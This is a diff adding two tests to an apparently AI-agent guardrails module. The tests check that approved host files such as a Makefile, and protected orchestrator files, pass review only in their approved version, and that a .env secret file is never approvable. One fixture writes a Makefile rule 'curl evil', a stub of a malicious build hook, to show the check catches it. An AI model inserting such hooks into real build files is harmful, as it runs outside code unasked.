@@ -4,7 +4,7 @@ import { execFileSync } from "node:child_process";
 import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
-import { installDeps, testFailure, verifyEvidence } from "../src/guardrails.ts";
+import { adoptKeys, installDeps, testFailure, verifyEvidence } from "../src/guardrails.ts";
 
 const git = (cwd: string, ...a: string[]) => execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@x.local", ...a], { cwd, encoding: "utf8" }).trim();
 
@@ -196,6 +196,46 @@ test("with install, a diff that touches a lockfile npm ci consumes needs CEO rev
     assert.equal(r.ok, false, f);
     assert.match((r as { reason: string }).reason, new RegExp(f.replace(".", "\\."), "i"), f);
   }
+});
+
+test("a host file passes only in the exact version the CEO approved", () => {
+  const { d, base } = repo();
+  writeFileSync(join(d, "Makefile"), "test: ; true\n");
+  git(d, "add", "-A");
+  git(d, "commit", "-qm", "make");
+  const first = verifyEvidence(d, base, GREEN);
+  assert.equal(first.ok, false);
+  const pending = (first as { host?: string[] }).host ?? [];
+  assert.deepEqual(pending, [`Makefile@${git(d, "rev-parse", "HEAD:Makefile")}`]);
+  assert.equal(verifyEvidence(d, base, GREEN, false, pending).ok, true);
+  writeFileSync(join(d, "Makefile"), "test: ; curl evil\n");
+  git(d, "commit", "-qam", "edit");
+  const again = verifyEvidence(d, base, GREEN, false, pending);
+  rmSync(d, { recursive: true, force: true });
+  assert.equal(again.ok, false);
+  assert.match((again as { reason: string }).reason, /Makefile@.*requires CEO review/);
+});
+
+test("an adopted protected file passes in the adopted version only; a secret is never protected-approvable", () => {
+  const { d, base } = repo();
+  mkdirSync(join(d, "orchestrator"));
+  writeFileSync(join(d, "orchestrator", "x.ts"), "export {};\n");
+  git(d, "add", "-A");
+  const approved = adoptKeys(d, base, git(d, "write-tree"), false);
+  git(d, "commit", "-qm", "adopted");
+  assert.deepEqual(approved, [`orchestrator/x.ts@${git(d, "rev-parse", "HEAD:orchestrator/x.ts")}`]);
+  assert.equal(verifyEvidence(d, base, GREEN).ok, false);
+  assert.equal(verifyEvidence(d, base, GREEN, false, approved).ok, true);
+  writeFileSync(join(d, "orchestrator", "x.ts"), "export const x = 1;\n");
+  git(d, "commit", "-qam", "dev edit");
+  const again = verifyEvidence(d, base, GREEN, false, approved);
+  writeFileSync(join(d, ".env"), "K=v\n");
+  git(d, "add", "-A");
+  git(d, "commit", "-qm", "env");
+  const env = verifyEvidence(d, base, GREEN, false, [...approved, `.env@${git(d, "rev-parse", "HEAD:.env")}`]);
+  rmSync(d, { recursive: true, force: true });
+  assert.match((again as { reason: string }).reason, /forbidden path \(orchestrator\/x\.ts\)/);
+  assert.match((env as { reason: string }).reason, /forbidden path .*\.env/);
 });
 
 test("a file hidden with assume-unchanged or skip-worktree voids the verification", () => {
